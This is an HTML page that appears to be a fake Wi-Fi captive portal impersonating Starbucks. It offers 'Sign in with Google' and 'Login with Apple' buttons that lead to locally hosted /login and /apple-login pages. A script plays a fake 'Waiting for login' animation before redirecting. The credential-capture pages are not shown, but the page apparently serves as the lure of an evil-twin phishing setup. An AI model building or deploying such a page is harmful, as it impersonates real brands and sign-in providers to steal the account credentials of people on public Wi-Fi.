<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Starbucks Free Wi-Fi</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Hanken+Grotesk:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Arial, Helvetica, sans-serif;
            background: linear-gradient(165deg, #00704a 0%, #006241 55%, #004d35 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ffffff;
            text-align: center;
            padding: 24px;
        }

        .card {
            max-width: 480px;
            width: 100%;
        }

        .logo {
            width: 210px;
            height: auto;
            display: block;
            margin: 0 auto 30px;
            filter: drop-shadow(0 8px 20px rgba(0, 0, 0, 0.35));
        }

        h1 {
            font-size: 34px;
            font-weight: 700;
            letter-spacing: 0.5px;
            margin-bottom: 10px;
            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.25);
        }

        .sub {
            font-size: 18px;
            color: rgba(255, 255, 255, 0.85);
            letter-spacing: 1px;
            margin-bottom: 46px;
        }

        .provider-btn {
            display: inline-flex;
            align-items: center;
            gap: 14px;
            font-size: 18px;
            font-weight: 600;
            padding: 14px 30px;
            border-radius: 8px;
            text-decoration: none;
            transition: transform 0.15s ease, box-shadow 0.15s ease;
        }

        .provider-btn:hover {
            transform: translateY(-2px);
        }

        .google-btn {
            background: #ffffff;
            color: #1f1f1f;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.25);
        }

        .google-btn:hover {
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.32);
        }

        .google-btn svg {
            width: 22px;
            height: 22px;
            flex-shrink: 0;
        }

        .apple-btn {
            background: #000000;
            color: #ffffff;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
            margin-top: 16px;
        }

        .apple-btn:hover {
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
        }

        .apple-btn svg {
            width: 20px;
            height: 20px;
            flex-shrink: 0;
        }

        .footer-note {
            margin-top: 42px;
            font-size: 13px;
            color: rgba(255, 255, 255, 0.6);
            letter-spacing: 0.5px;
        }

        .footer-links {
            margin-top: 14px;
            font-size: 13px;
            color: rgba(255, 255, 255, 0.7);
            letter-spacing: 0.5px;
        }

        .footer-links a {
            color: rgba(255, 255, 255, 0.9);
            text-decoration: underline;
            text-underline-offset: 3px;
            transition: color 0.15s ease;
        }

        .footer-links a:hover {
            color: #ffffff;
        }

        .footer-links .sep {
            margin: 0 10px;
            opacity: 0.6;
        }

        /* ---------- CONNECTING OVERLAY ---------- */
        .overlay {
            position: fixed;
            inset: 0;
            background: linear-gradient(165deg, #00704a 0%, #006241 55%, #004d35 100%);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 100;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.45s ease;
        }

        .overlay.active {
            opacity: 1;
            pointer-events: auto;
        }

        .overlay.fade {
            opacity: 0;
        }

        .overlay .logo {
            width: 130px;
            margin-bottom: 28px;
            animation: overlayPulse 1.5s ease-in-out infinite;
        }

        @keyframes overlayPulse {
            0%, 100% {
                transform: scale(1);
                filter: drop-shadow(0 0 12px rgba(255, 255, 255, 0.2));
            }
            50% {
                transform: scale(1.07);
                filter: drop-shadow(0 0 30px rgba(255, 255, 255, 0.55));
            }
        }

        .overlay .msg {
            font-size: 20px;
            color: #ffffff;
            letter-spacing: 1px;
            font-weight: 500;
        }

        .dots::after {
            content: '';
            animation: dots 1.2s steps(4) infinite;
        }

        @keyframes dots {
            0%   { content: ''; }
            25%  { content: '.'; }
            50%  { content: '..'; }
            75%  { content: '...'; }
        }

        .progress-track {
            width: 260px;
            max-width: 70vw;
            height: 6px;
            background: rgba(255, 255, 255, 0.25);
            border-radius: 3px;
            margin-top: 30px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            width: 0;
            background: #ffffff;
            border-radius: 3px;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
        }

        .overlay.active .progress-fill {
            transition: width 1.9s ease-in-out;
            width: 100%;
        }
    </style>
</head>
<body>

    <div class="card">
        <img src="/images/starbucks-logo-white.png" alt="Starbucks" class="logo">
        <h1>Starbucks free Wi-Fi</h1>
        <p class="sub">Click here to connect</p>

        <a href="/login" class="provider-btn google-btn">
            <svg viewBox="0 0 48 48" aria-hidden="true">
                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
            </svg>
            Sign in with Google
        </a>

        <a href="/apple-login" class="provider-btn apple-btn">
            <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
                <path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.03 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.56-1.702z"/>
            </svg>
            Login with Apple
        </a>

        <p class="footer-note">By connecting you agree to the Starbucks Wi-Fi terms of use.</p>
        <p class="footer-links">
            <a href="https://www.starbucks.com/terms/privacy-notice/" target="_blank" rel="noopener">Privacy Policy</a>
            <span class="sep">&bull;</span>
            &copy; Starbucks 2026
        </p>
    </div>

    <div class="overlay" id="connectOverlay">
        <img src="/images/starbucks-logo-white.png" alt="Starbucks" class="logo">
        <p class="msg">Waiting for login<span class="dots"></span></p>
        <div class="progress-track"><div class="progress-fill"></div></div>
    </div>

    <script>
        // Show the connecting animation, then go to the existing /login page
        const overlay = document.getElementById('connectOverlay');

        document.querySelectorAll('.google-btn, .apple-btn').forEach(function (connectBtn) {
            connectBtn.addEventListener('click', function (e) {
                e.preventDefault();
                if (this.dataset.clicked) return;
                this.dataset.clicked = '1';
                this.style.pointerEvents = 'none';
                const target = this.getAttribute('href') || '/login';

                overlay.classList.add('active');

                setTimeout(function () {
                    overlay.classList.add('fade');
                    setTimeout(function () {
                        window.location.href = target;
                    }, 450);
                }, 1900);
            });
        });
    </script>
</body>
</html>
